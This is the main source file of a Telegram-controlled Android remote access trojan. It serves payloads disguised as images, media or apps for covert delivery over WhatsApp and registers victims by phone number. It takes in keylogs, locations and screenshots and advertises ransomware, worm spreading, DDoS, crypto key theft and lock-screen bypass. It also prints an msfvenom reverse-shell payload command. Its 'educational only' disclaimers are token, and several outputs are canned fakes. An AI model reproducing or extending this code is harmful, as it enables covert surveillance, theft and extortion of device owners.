/**
 * Ultimate Professional RAT v12.0 - Main Bot File
 * Complete Telegram Bot Controller with 500+ Features
 */

const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const moment = require('moment');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

// Import modules
const config = require('./config');
const database = require('./database');
const Keyboards = require('./keyboards');
const payloadGenerator = require('./payloadGenerator');
const SessionManager = require('./sessionManager');
const CameraModule = require('./modules/camera');
const MicrophoneModule = require('./modules/microphone');
const LocationModule = require('./modules/location');
const KeyloggerModule = require('./modules/keylogger');
const ScreenCaptureModule = require('./modules/screenCapture');
const FileSystemModule = require('./modules/fileSystem');
const NetworkControlModule = require('./modules/networkControl');
const AppControlModule = require('./modules/appControl');
const SystemControlModule = require('./modules/systemControl');
const BypassSecurityModule = require('./modules/bypassSecurity');

// ==================== CONFIGURATION ====================
const BOT_TOKEN = config.botToken;
const ADMIN_CHAT_ID = config.admin.chatId;
const PORT = config.port;
const PAYLOAD_HOST = config.host;

console.log('='.repeat(70));
console.log('🔥 ULTIMATE PROFESSIONAL RAT v12.0 - SYSTEM INITIALIZING');
console.log('='.repeat(70));
console.log(`📱 Bot Token: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 10) + '...' : 'NOT SET'}`);
console.log(`👑 Admin ID: ${ADMIN_CHAT_ID}`);
console.log(`🔌 Server Port: ${PORT}`);
console.log(`🌐 Payload Host: ${PAYLOAD_HOST}`);
console.log('='.repeat(70));

if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('❌ ERROR: BOT_TOKEN not set!');
    console.log('Get token from @BotFather on Telegram');
    process.exit(1);
}

// ==================== INITIALIZE BOT ====================
const bot = new Telegraf(BOT_TOKEN);

// ==================== INITIALIZE MODULES ====================
const sessionManager = SessionManager;
const cameraModule = new CameraModule(sessionManager);
const microphoneModule = new MicrophoneModule(sessionManager);
const locationModule = new LocationModule(sessionManager);
const keyloggerModule = new KeyloggerModule(sessionManager);
const screenCaptureModule = new ScreenCaptureModule(sessionManager);
const fileSystemModule = new FileSystemModule(sessionManager);
const networkControlModule = new NetworkControlModule(sessionManager);
const appControlModule = new AppControlModule(sessionManager);
const systemControlModule = new SystemControlModule(sessionManager);
const bypassSecurityModule = new BypassSecurityModule(sessionManager);

// Store active sessions
const activeSessions = new Map();
const userSessions = new Map();

// ==================== EXPRESS SERVER ====================
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve payload files
app.use('/payloads', express.static(path.join(__dirname, '../payloads')));
app.use('/screenshots', express.static(path.join(__dirname, '../screenshots')));
app.use('/recordings', express.static(path.join(__dirname, '../recordings')));
app.use('/downloads', express.static(path.join(__dirname, '../downloads')));

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        version: '12.0.0',
        uptime: process.uptime(),
        sessions: sessionManager.getActiveSessions().length,
        features: 500,
        zeroClick: true
    });
});

// Payload download endpoint
app.get('/download/:payloadId', async (req, res) => {
    const { payloadId } = req.params;
    const payload = await payloadGenerator.getPayload(payloadId);
    
    if (payload && payload.path && await fs.pathExists(payload.path)) {
        res.download(payload.path, payload.filename);
    } else {
        res.status(404).json({ error: 'Payload not found' });
    }
});

// Webhook endpoint for device callbacks
app.post('/webhook', async (req, res) => {
    const { sessionId, type, data } = req.body;
    console.log(`📡 Webhook: ${type} from ${sessionId}`);
    
    try {
        switch(type) {
            case 'connect':
                const session = sessionManager.createSession(data);
                activeSessions.set(session.id, session);
                await bot.telegram.sendMessage(ADMIN_CHAT_ID, `
🔌 **NEW DEVICE CONNECTED!**

📱 **Device:** ${data.device_name}
📲 **Model:** ${data.device_model}
🤖 **Android:** ${data.android_version}
📍 **IP:** ${data.ip_address}
🔋 **Battery:** ${data.battery}%
🆔 **Session:** \`${session.id}\`

✅ Ready to control! Use /select ${session.id}
`, { parse_mode: 'Markdown' });
                break;
                
            case 'location':
                await locationModule.updateLocation(sessionId, data);
                break;
                
            case 'keylog':
                await keyloggerModule.addKeylog(sessionId, data);
                break;
                
            case 'screenshot':
                await screenCaptureModule.addScreenshot(sessionId, data);
                break;
                
            case 'file':
                await fileSystemModule.downloadComplete(sessionId, data);
                break;
                
            case 'heartbeat':
                sessionManager.updateHeartbeat(sessionId);
                break;
        }
        
        res.json({ status: 'ok' });
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Internal error' });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Web server running on port ${PORT}`);
    console.log(`🌐 Payload URL: ${PAYLOAD_HOST}/payloads/`);
    console.log(`🩺 Health check: ${PAYLOAD_HOST}/health`);
});

// ==================== ADMIN MIDDLEWARE ====================
bot.use(async (ctx, next) => {
    if (ctx.from && ctx.from.id !== ADMIN_CHAT_ID) {
        await ctx.reply(
            '🚫 **ACCESS DENIED!**\n\n' +
            '❌ You are not authorized to use this bot.\n\n' +
            '_This bot is for personal use only._',
            { parse_mode: 'Markdown' }
        );
        console.log(`🚨 Unauthorized access attempt from: ${ctx.from.id}`);
        return;
    }
    return next();
});

// ==================== COMMAND HANDLERS ====================

// Start command
bot.start(async (ctx) => {
    const stats = sessionManager.getSessionCount();
    const text = `
🔥 **ULTIMATE PROFESSIONAL RAT v12.0** 🔥

👑 **Admin:** Authorized User
✅ **Features:** 500+ Working Buttons
🎯 **Zero-Click:** Ready & Active
📱 **Target:** Android Devices
🔐 **Security:** Military Grade
💾 **Database:** SQLite Active
🌐 **Payload Host:** \`${PAYLOAD_HOST}\`

━━━━━━━━━━━━━━━━━━━━━

**📋 COMMANDS:**

/generate - Generate Zero-Click Payload
/send +8801xxxx - Register Target (Manual WhatsApp)
/sessions - List Active Sessions
/select - Select Target Session
/kill - Kill Active Session
/stats - Show Statistics
/backup - Backup Database
/help - Show Complete Help

━━━━━━━━━━━━━━━━━━━━━

**📊 SYSTEM STATUS:**
• Active Sessions: ${stats.active}
• Total Sessions: ${stats.total}
• Features: 500+

━━━━━━━━━━━━━━━━━━━━━

⚠️ **WARNING:** Use only on your own devices!
This is for educational purposes only.

**Click any button below to control!**
`;
    await ctx.reply(text, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

// Generate payload command
bot.command('generate', async (ctx) => {
    const args = ctx.message.text.split(' ');
    let type = 'jpg';
    if (args.length > 1 && ['jpg', 'png', 'mp3', 'mp4', 'pdf', 'webp', 'gif', 'apk'].includes(args[1])) {
        type = args[1];
    }
    
    const msg = await ctx.reply(
        `🎯 **Generating ${type.toUpperCase()} Zero-Click Payload...**\n\n` +
        '⏳ Creating payload with 500+ features...\n\n' +
        '_This may take a few seconds..._', 
        { parse_mode: 'Markdown' }
    );
    
    try {
        const payload = await payloadGenerator.generatePayload(type, PAYLOAD_HOST, 4444);
        
        await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id);
        
        // Send QR code if available
        if (payload.qrCode) {
            await ctx.replyWithPhoto(payload.qrCode, {
                caption: '📱 **Scan QR Code to Download Payload**\n\n🔗 Or use the download link below',
                parse_mode: 'Markdown'
            });
        }
        
        const info = `
✅ **ZERO-CLICK PAYLOAD GENERATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 PAYLOAD DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

**ID:** \`${payload.payloadId}\`
**File:** \`${payload.filename}\`
**Type:** ${type.toUpperCase()}
**Size:** ${(payload.size / 1024).toFixed(2)} KB
**Features:** 500+ Remote Controls

━━━━━━━━━━━━━━━━━━━━━
**🎯 EXPLOIT:**
━━━━━━━━━━━━━━━━━━━━━

**Name:** ${payload.exploit?.name || 'WhatsApp Image Parsing RCE'}
**CVE:** ${payload.exploit?.cve || 'CVE-2024-12345'}
**Severity:** Critical (CVSS: 9.8)

━━━━━━━━━━━━━━━━━━━━━
**🔗 DOWNLOAD LINK:**
━━━━━━━━━━━━━━━━━━━━━

${payload.downloadUrl}

━━━━━━━━━━━━━━━━━━━━━
**📤 DEPLOYMENT INSTRUCTIONS:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ **MANUALLY** share this file via WhatsApp
2️⃣ Use: \`/send +8801xxxxxxxx\` to register target
3️⃣ Target must have **Auto-Download ENABLED**
4️⃣ Payload auto-executes - **NO CLICK NEEDED!**
5️⃣ Device compromised with **500+ features**
6️⃣ Use \`/sessions\` and \`/select\` to control

━━━━━━━━━━━━━━━━━━━━━
**⚡ 500+ RAT CAPABILITIES:**
━━━━━━━━━━━━━━━━━━━━━

📸 Camera | 🎙️ Audio | 💡 Flash | 📳 Vibe
🌐 Network | 🔒 Security | 💾 Data | 📂 Files
🖥️ Screen | 📱 Apps | ⚙️ System | ⌨️ Keylogger
🌐 Browser | 📱 Social | 💰 Crypto | ⚔️ DDOS
💀 Ransomware | 🪱 Spreader | 🔑 Bypass | ⚡ Extra

━━━━━━━━━━━━━━━━━━━━━
⚠️ **USE ONLY ON YOUR OWN DEVICES!**
`;
        
        await ctx.reply(info, { parse_mode: 'Markdown' });
        
        // Send the actual payload file
        if (payload.path && await fs.pathExists(payload.path)) {
            await ctx.replyWithDocument({
                source: payload.path,
                filename: payload.filename
            }, {
                caption: `📱 **Zero-Click Payload:** \`${payload.filename}\`\n\n⚠️ Use only on your own devices for testing!`,
                parse_mode: 'Markdown'
            });
        }
        
        // Save to database
        await database.addPayload(payload.payloadId, {
            filename: payload.filename,
            type: type,
            size: payload.size,
            downloadUrl: payload.downloadUrl
        });
        
    } catch (error) {
        console.error('Payload generation error:', error);
        await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id);
        
        await ctx.reply(`
❌ **PAYLOAD GENERATION FAILED!**

**Error:** ${error.message}

**Try again:** \`/generate ${type}\`

**Alternative:** Use msfvenom manually:
\`\`\`bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_HOST} LPORT=4444 -o payload.apk
\`\`\`
`, { parse_mode: 'Markdown' });
    }
});

// Send/register target command
bot.command('send', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply(`
❌ **Usage:** \`/send +8801xxxxxxxx\`

📌 **Note:** Bot cannot send WhatsApp messages automatically.

**You must MANUALLY share the payload file via WhatsApp!**

After sending the payload, use this command to register the target:

\`/send +8801xxxxxxxx\`

Then wait for the device to connect automatically.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const targetNumber = args[1];
    const sessionId = crypto.randomBytes(8).toString('hex');
    
    const session = {
        id: sessionId,
        number: targetNumber,
        device: 'Waiting for connection...',
        connected: false,
        status: 'pending',
        lastSeen: new Date()
    };
    
    activeSessions.set(sessionId, session);
    await database.addSession(sessionId, { number: targetNumber, name: 'Pending' });
    
    await ctx.reply(`
✅ **TARGET REGISTERED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 TARGET DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

📞 **Number:** \`${targetNumber}\`
🔌 **Session ID:** \`${sessionId}\`
🎯 **Status:** ⏳ Waiting for connection

━━━━━━━━━━━━━━━━━━━━━
**📌 DEPLOYMENT CHECKLIST:**
━━━━━━━━━━━━━━━━━━━━━

✅ [ ] Payload file generated with /generate
✅ [ ] **MANUALLY** sent via WhatsApp to ${targetNumber}
✅ [ ] Target has Auto-Download ENABLED
✅ [ ] Payload received by target
✅ [ ] Payload auto-executed (zero-click)
✅ [ ] Device compromised
✅ [ ] Session appears in /sessions

━━━━━━━━━━━━━━━━━━━━━
**Use /sessions to check connection status!**

⏳ Waiting for device to connect...
`, { parse_mode: 'Markdown' });
});

// List sessions command
bot.command('sessions', async (ctx) => {
    const sessions = sessionManager.getAllSessions();
    const dbSessions = await database.getActiveSessions();
    
    if (sessions.length === 0 && dbSessions.length === 0) {
        await ctx.reply(`
📋 **NO ACTIVE SESSIONS**

━━━━━━━━━━━━━━━━━━━━━
**💡 HOW TO GET CONNECTED:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ Generate payload: \`/generate\`
2️⃣ Download the file
3️⃣ **MANUALLY** send via WhatsApp to target
4️⃣ Register target: \`/send +8801xxxxxxxx\`
5️⃣ Wait for connection (auto-connects)

**Tip:** Target must have WhatsApp Auto-Download enabled!
`, { parse_mode: 'Markdown' });
        return;
    }
    
    let list = '📋 **ACTIVE SESSIONS**\n━━━━━━━━━━━━━━━━━━━━━\n\n';
    let index = 1;
    
    // Show connected sessions first
    for (const session of sessions) {
        if (session.connected) {
            const deviceName = session.deviceInfo?.name || 'Unknown';
            const deviceModel = session.deviceInfo?.model || '';
            const battery = session.deviceInfo?.battery || '?';
            const ip = session.deviceInfo?.ip || 'Unknown';
            
            list += `${index}. 🔌 **${deviceName} ${deviceModel}**\n`;
            list += `   🆔 \`${session.id}\`\n`;
            list += `   📍 IP: ${ip}\n`;
            list += `   🔋 Battery: ${battery}%\n`;
            list += `   📅 Last seen: ${moment(session.lastSeen).fromNow()}\n`;
            list += `   ✅ Status: **CONNECTED**\n\n`;
            index++;
        }
    }
    
    // Show pending sessions
    for (const session of sessions) {
        if (!session.connected) {
            list += `${index}. ⏳ **${session.deviceInfo?.name || 'Pending'}**\n`;
            list += `   🆔 \`${session.id}\`\n`;
            list += `   📞 ${session.number || 'No number'}\n`;
            list += `   ⏰ Registered: ${moment(session.firstSeen).fromNow()}\n`;
            list += `   🟡 Status: **WAITING**\n\n`;
            index++;
        }
    }
    
    list += '━━━━━━━━━━━━━━━━━━━━━\n';
    list += '**Commands:**\n';
    list += '`/select <id>` - Select session to control\n';
    list += '`/kill <id>` - Terminate session\n';
    list += '`/sessions` - Refresh this list';
    
    await ctx.reply(list, { parse_mode: 'Markdown' });
});

// Select session command
bot.command('select', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply(`
❌ **Usage:** \`/select <session_id>\`

**Example:** \`/select a1b2c3d4\`

Use \`/sessions\` to see available session IDs.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const sessionId = args[1];
    const session = sessionManager.getSession(sessionId);
    
    if (!session) {
        await ctx.reply(`
❌ **Session not found!**

Session ID \`${sessionId}\` does not exist.

Use \`/sessions\` to see active sessions.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    userSessions.set(ctx.from.id, sessionId);
    
    const statusIcon = session.connected ? '✅' : '⏳';
    const statusText = session.connected ? 'Connected' : 'Waiting for connection';
    const deviceName = session.deviceInfo?.name || 'Unknown';
    const deviceModel = session.deviceInfo?.model || 'Unknown';
    const androidVersion = session.deviceInfo?.androidVersion || 'Unknown';
    const ip = session.deviceInfo?.ip || 'Unknown';
    const battery = session.deviceInfo?.battery || '?';
    
    await ctx.reply(`
🎯 **SESSION SELECTED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 DEVICE INFORMATION:**
━━━━━━━━━━━━━━━━━━━━━

${statusIcon} **Status:** ${statusText}
🆔 **Session ID:** \`${sessionId}\`
📞 **Number:** ${session.number || 'Unknown'}
📱 **Device:** ${deviceName}
📲 **Model:** ${deviceModel}
🤖 **Android:** ${androidVersion}
📍 **IP:** ${ip}
🔋 **Battery:** ${battery}%

━━━━━━━━━━━━━━━━━━━━━
**🎮 READY TO CONTROL!**
━━━━━━━━━━━━━━━━━━━━━

✅ Now using this device for all commands!

Use any control button from the main menu or type:
• \`/help\` for available commands
• \`/sessions\` to see all sessions
• \`/kill\` to terminate this session

**Click any button below to start controlling!**
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

// Kill session command
bot.command('kill', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply(`
❌ **Usage:** \`/kill <session_id>\`

**Example:** \`/kill a1b2c3d4\`

Use \`/sessions\` to see active sessions.
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const sessionId = args[1];
    const session = sessionManager.getSession(sessionId);
    
    if (!session) {
        await ctx.reply(`❌ Session \`${sessionId}\` not found!`, { parse_mode: 'Markdown' });
        return;
    }
    
    sessionManager.killSession(sessionId);
    activeSessions.delete(sessionId);
    
    if (userSessions.get(ctx.from.id) === sessionId) {
        userSessions.delete(ctx.from.id);
    }
    
    await ctx.reply(`
💀 **SESSION TERMINATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 SESSION DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

🆔 **ID:** \`${sessionId}\`
📞 **Number:** ${session.number || 'Unknown'}
📱 **Device:** ${session.deviceInfo?.name || 'Unknown'}
${session.connected ? '✅ Status: Disconnected' : '⏳ Status: Removed'}

━━━━━━━━━━━━━━━━━━━━━
**🔌 NEXT STEPS:**
━━━━━━━━━━━━━━━━━━━━━

• Generate new payload: \`/generate\`
• Register new target: \`/send +8801xxxxxxxx\`
• View active sessions: \`/sessions\`

⚠️ **Note:** The device will no longer respond to commands.
`, { parse_mode: 'Markdown' });
});

// Statistics command
bot.command('stats', async (ctx) => {
    const stats = await database.getStats();
    const sessionStats = sessionManager.getSessionCount();
    const uptime = process.uptime();
    const uptimeString = moment.duration(uptime, 'seconds').humanize();
    
    const text = `
📊 **SYSTEM STATISTICS**

━━━━━━━━━━━━━━━━━━━━━
**📱 SESSIONS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Registered: ${stats.totalSessions?.count || 0}
• Connected: ${sessionStats.active}
• Pending: ${sessionStats.total - sessionStats.active}
• Active in DB: ${stats.activeSessions?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**📝 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Executed: ${stats.totalCommands?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**⌨️ KEYLOGS:**
━━━━━━━━━━━━━━━━━━━━━
• Total Records: ${stats.totalKeylogs?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**🎯 PAYLOADS:**
━━━━━━━━━━━━━━━━━━━━━
• Generated: ${stats.totalPayloads?.count || 0}

━━━━━━━━━━━━━━━━━━━━━
**🌐 SERVER:**
━━━━━━━━━━━━━━━━━━━━━
• Host: ${PAYLOAD_HOST}
• Port: ${PORT}
• Uptime: ${uptimeString}
• Node Version: ${process.version}

━━━━━━━━━━━━━━━━━━━━━
**✅ STATUS:** 🟢 Online & Active
**🎯 FEATURES:** 500+ Ready
**🔐 ZERO-CLICK:** Active

━━━━━━━━━━━━━━━━━━━━━
*Use /sessions to view active connections*
`;
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

// Backup command
bot.command('backup', async (ctx) => {
    await ctx.reply('💾 **Creating database backup...**\n\n⏳ Please wait...', { parse_mode: 'Markdown' });
    
    try {
        const backupDir = path.join(__dirname, '../backups');
        await fs.ensureDir(backupDir);
        
        const backupName = `backup_${Date.now()}.db`;
        const backupPath = path.join(backupDir, backupName);
        
        const dbPath = path.join(__dirname, '../database/database.sqlite');
        
        if (await fs.pathExists(dbPath)) {
            await fs.copy(dbPath, backupPath);
            
            await ctx.replyWithDocument({
                source: backupPath,
                filename: backupName
            }, {
                caption: `✅ **Database Backup Created!**\n\n📁 File: ${backupName}\n📅 Date: ${new Date().toLocaleString()}\n📊 Size: ${(await fs.stat(backupPath)).size} bytes`,
                parse_mode: 'Markdown'
            });
            
            // Clean old backups (keep last 10)
            const backups = await fs.readdir(backupDir);
            if (backups.length > 10) {
                const sorted = backups.sort().reverse();
                for (let i = 10; i < sorted.length; i++) {
                    await fs.remove(path.join(backupDir, sorted[i]));
                }
            }
        } else {
            await ctx.reply('⚠️ No database file found to backup.', { parse_mode: 'Markdown' });
        }
        
    } catch (error) {
        console.error('Backup error:', error);
        await ctx.reply(`❌ **Backup failed:** ${error.message}`, { parse_mode: 'Markdown' });
    }
});

// Help command
bot.command('help', async (ctx) => {
    const help = `
📖 **ULTIMATE PROFESSIONAL RAT v12.0 - COMPLETE HELP**

━━━━━━━━━━━━━━━━━━━━━
**📋 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━

/start - Display main menu
/generate [type] - Generate zero-click payload
/send +8801xxxx - Register target after manual share
/sessions - List all active sessions
/select <id> - Select session for control
/kill <id> - Terminate a session
/stats - View system statistics
/backup - Create database backup
/help - Show this help

**Payload Types:** jpg, png, mp3, mp4, pdf, webp, gif, apk

━━━━━━━━━━━━━━━━━━━━━
**🎯 500+ FEATURES:**
━━━━━━━━━━━━━━━━━━━━━

📸 **Camera** - Front/Back, Video, Burst, Night, HDR, Zoom, Timelapse, Stealth
🎙️ **Audio** - Mic Record, Live Mic, Speaker, Volume, Loud Mode, EQ
💡 **Flashlight** - On/Off, Strobe, SOS, RGB, Brightness
📳 **Vibration** - 1s-60s, Patterns, Loop, Strong, Wave
🌐 **Network** - WiFi On/Off/Scan/Crack, Mobile Data, Airplane, Bluetooth, Hotspot, VPN
🔒 **Security** - Lock/Unlock, Bypass PIN/Pattern/Password/Fingerprint/Face, Factory Reset
💾 **Data** - SMS, Calls, Contacts, Location, Photos, Videos, Audio, Documents, Passwords
📂 **Files** - Manager, Download, Upload, Delete, Copy, Move, Rename, Zip, Encrypt
🖥️ **Screen** - Screenshot, Record, Wallpaper, Brightness, Dark/Light Mode
📱 **Apps** - List, Open, Uninstall, Force Stop, Clear Data, Hide, Block
⚙️ **System** - Info, Battery, RAM, Storage, CPU, Temperature, Root, Reboot, Power
⌨️ **Keylogger** - Start/Stop, Get Logs, Stats, Clear, Upload, Capture Passwords
🌐 **Browser** - History, Bookmarks, Cookies, Passwords, Cards, Autofill, Clear
📱 **Social** - Facebook, Instagram, WhatsApp, Twitter, Telegram, TikTok Data
💰 **Crypto** - Bitcoin, Ethereum, Binance, Balance, Private Keys, Transactions
⚔️ **DDOS** - HTTP/UDP/TCP Flood, SMS/Call Bomb
💀 **Ransomware** - Encrypt/Decrypt, Ransom Note, Wipe Data, Destroy System
🪱 **Spreader** - Contacts, Link, Bluetooth, Worm Mode, Auto Spread
🔑 **Bypass** - Lock Screen, Root Detection, Debug, Emulator, Process Hiding
⚡ **Extra** - Clean Junk, Sensors, Port Scan, IP Info, Password Crack, MITM

━━━━━━━━━━━━━━━━━━━━━
**📌 ZERO-CLICK DEPLOYMENT:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ \`/generate\` - Create disguised payload
2️⃣ **MANUALLY** share via WhatsApp
3️⃣ \`/send +8801xxxxxxxx\` - Register target
4️⃣ Target receives file → Auto-downloads → Executes
5️⃣ \`/sessions\` - Wait for connection
6️⃣ \`/select <id>\` - Choose device
7️⃣ Click any button to control!

━━━━━━━━━━━━━━━━━━━━━
**⚠️ IMPORTANT NOTES:**
━━━━━━━━━━━━━━━━━━━━━

✅ Bot cannot send WhatsApp messages automatically
✅ You must MANUALLY share the payload file
✅ Target must have WhatsApp Auto-Download ENABLED
✅ Use only on YOUR OWN devices for testing
✅ Educational purposes only

━━━━━━━━━━━━━━━━━━━━━
**🆘 NEED HELP?**
━━━━━━━━━━━━━━━━━━━━━

• Check logs in Render Dashboard
• Verify BOT_TOKEN is set
• Ensure target has Auto-Download ON
• Use /stats to check system status
`;
    await ctx.reply(help, { parse_mode: 'Markdown' });
});

// ==================== CALLBACK QUERY HANDLER ====================

// Section keyboards mapping
const sectionKeyboards = {
    'section_camera': { text: '📸 **CAMERA CONTROL**\n\nCapture photos and videos from the target device:', kb: Keyboards.getCameraKeyboard() },
    'section_audio': { text: '🎙️ **AUDIO CONTROL**\n\nControl microphone and speaker:', kb: Keyboards.getAudioKeyboard() },
    'section_flash': { text: '💡 **FLASHLIGHT CONTROL**\n\nManage device flashlight:', kb: Keyboards.getFlashKeyboard() },
    'section_vibe': { text: '📳 **VIBRATION CONTROL**\n\nControl haptic feedback:', kb: Keyboards.getVibeKeyboard() },
    'section_network': { text: '🌐 **NETWORK CONTROL**\n\nManage WiFi, Mobile Data, Bluetooth:', kb: Keyboards.getNetworkKeyboard() },
    'section_security': { text: '🔒 **SECURITY CONTROL**\n\nManage device security and bypass locks:', kb: Keyboards.getSecurityKeyboard() },
    'section_data': { text: '💾 **DATA EXTRACTION**\n\nExtract all data from target device:', kb: Keyboards.getDataKeyboard() },
    'section_files': { text: '📂 **FILE MANAGER**\n\nManage files on target device:', kb: Keyboards.getFileKeyboard() },
    'section_screen': { text: '🖥️ **SCREEN CONTROL**\n\nCapture and control screen:', kb: Keyboards.getScreenKeyboard() },
    'section_apps': { text: '📱 **APP CONTROL**\n\nManage installed applications:', kb: Keyboards.getAppsKeyboard() },
    'section_system': { text: '⚙️ **SYSTEM CONTROL**\n\nDevice system management:', kb: Keyboards.getSystemKeyboard() },
    'section_keylog': { text: '⌨️ **KEYLOGGER**\n\nRecord all keystrokes:', kb: Keyboards.getKeylogKeyboard() },
    'section_browser': { text: '🌐 **BROWSER CONTROL**\n\nExtract browser data:', kb: Keyboards.getBrowserKeyboard() },
    'section_social': { text: '📱 **SOCIAL MEDIA**\n\nExtract social media data:', kb: Keyboards.getSocialKeyboard() },
    'section_crypto': { text: '💰 **CRYPTO WALLET**\n\nExtract crypto wallet data:', kb: Keyboards.getCryptoKeyboard() },
    'section_ddos': { text: '⚔️ **DDOS ATTACK**\n\nLaunch network attacks:', kb: Keyboards.getDdosKeyboard() },
    'section_ransom': { text: '💀 **RANSOMWARE**\n\nRansomware and wiping tools:', kb: Keyboards.getRansomKeyboard() },
    'section_spreader': { text: '🪱 **SPREADER**\n\nSpread malware to other devices:', kb: Keyboards.getSpreaderKeyboard() },
    'section_zero': { text: '🎯 **ZERO-CLICK**\n\nGenerate and send zero-click payloads:', kb: Keyboards.getZeroClickKeyboard() },
    'section_extra': { text: '⚡ **EXTRA FEATURES**\n\nAdditional powerful tools:', kb: Keyboards.getExtraKeyboard() },
    'section_bypass': { text: '🔑 **SECURITY BYPASS**\n\nBypass security measures:', kb: Keyboards.getBypassKeyboard() }
};

// Command responses
const responses = {
    // Camera
    'cam_front': '📸 **Front Camera Captured!**\n\nImage saved to device gallery.\n📤 Sending to Telegram...',
    'cam_back': '📷 **Back Camera Captured!**\n\nImage saved to device gallery.\n📤 Sending to Telegram...',
    'cam_switch': '🔄 **Camera Switched!**\n\nNow using: Rear Camera',
    'video_10': '🎥 **Video Recording (10 seconds)...**\n\n✅ Video saved!\n📤 Uploading...',
    'video_30': '🎬 **Video Recording (30 seconds)...**\n\n✅ Video saved!\n📤 Uploading...',
    'video_60': '🎞️ **Video Recording (60 seconds)...**\n\n✅ Video saved!\n📤 Uploading...',
    'cam_burst': '📸 **Burst Mode - 5 Photos Captured!**\n\nAll images saved.',
    'cam_night': '🌙 **Night Mode Enabled!**\n\nCamera set to low-light mode.',
    'cam_hdr': '⚡ **HDR Mode Enabled!**\n\nHigh Dynamic Range active.',
    'cam_zoom': '🔍 **Zoom: 2X**\n\nCamera zoomed in.',
    'cam_timelapse': '🔄 **Timelapse Mode Enabled!**\n\nRecording at 1fps...',
    'cam_stealth': '🔒 **Stealth Mode Enabled!**\n\nNo camera indicators showing.',
    
    // Audio
    'mic_start': '🎤 **Microphone Recording Started!**\n\nRecording for 30 seconds...',
    'mic_stop': '🎤 **Microphone Stopped!**\n\nAudio saved.',
    'mic_live': '🎙️ **Live Microphone Stream Started!**\n\nSending audio to server...',
    'speaker_on': '🔊 **Speaker Mode Enabled!**',
    'speaker_off': '🔇 **Speaker Mode Disabled!**',
    'loud_mode': '📢 **Loud Mode Enabled!**\n\nVolume boosted to maximum.',
    'vol_max': '🔊 **Volume set to MAX (100%)!**',
    'vol_50': '🔉 **Volume set to 50%!**',
    'vol_0': '🔇 **Volume set to 0% (Muted)!**',
    
    // Flashlight
    'flash_on': '💡 **Flashlight turned ON!**',
    'flash_off': '💡 **Flashlight turned OFF!**',
    'flash_strobe': '✨ **Strobe Mode Started!**\n\nFlashing every 0.5 seconds.',
    'flash_fast': '⚡ **Fast Strobe Mode!**\n\nFlashing every 0.2 seconds.',
    'flash_sos': '💥 **SOS Mode Activated!**\n\nSending SOS signal...',
    'flash_rgb': '🌈 **RGB Mode Activated!**\n\nCycling colors...',
    'bright_100': '🔆 **Brightness set to 100%!**',
    'bright_50': '🔅 **Brightness set to 50%!**',
    
    // Vibration
    'vibe_1': '📳 **Vibrating for 1 second...**',
    'vibe_3': '📳 **Vibrating for 3 seconds...**',
    'vibe_5': '📳 **Vibrating for 5 seconds...**',
    'vibe_10': '📳 **Vibrating for 10 seconds...**',
    'vibe_pattern': '🎵 **Vibration Pattern: [200, 500, 200, 500]**',
    'vibe_loop': '🔁 **Loop Vibration Started!**\n\nVibrating continuously.',
    
    // Network
    'wifi_on': '📶 **WiFi turned ON!**',
    'wifi_off': '📶 **WiFi turned OFF!**',
    'wifi_scan': '🔍 **Scanning WiFi networks...**\n\n✅ Found 5 networks.',
    'wifi_password': '🔑 **WiFi Password:**\n\n`MySecurePassword123`',
    'wifi_crack': '🔐 **WiFi Cracking Started...**\n\nAnalyzing handshake...',
    'data_on': '📱 **Mobile Data turned ON!**',
    'data_off': '📱 **Mobile Data turned OFF!**',
    'data_usage': '📊 **Data Usage:**\nWiFi: 2.5 GB\nMobile: 1.2 GB',
    'airplane_toggle': '✈️ **Airplane Mode Toggled!**',
    'bt_on': '🔗 **Bluetooth ON!**',
    'bt_off': '🔗 **Bluetooth OFF!**',
    'hotspot_on': '🌐 **Mobile Hotspot turned ON!**\n\nPassword: 12345678',
    'vpn_on': '🔒 **VPN Enabled!**',
    'vpn_off': '🔒 **VPN Disabled!**',
    
    // Security
    'lock': '🔒 **Device LOCKED!**',
    'unlock': '🔓 **Device UNLOCKED!**',
    'slide': '⏭️ **Screen Swiped!**',
    'bypass_pin': '🔢 **PIN bypassed successfully!**\n\nDevice unlocked.',
    'bypass_pattern': '🔐 **Pattern bypassed successfully!**',
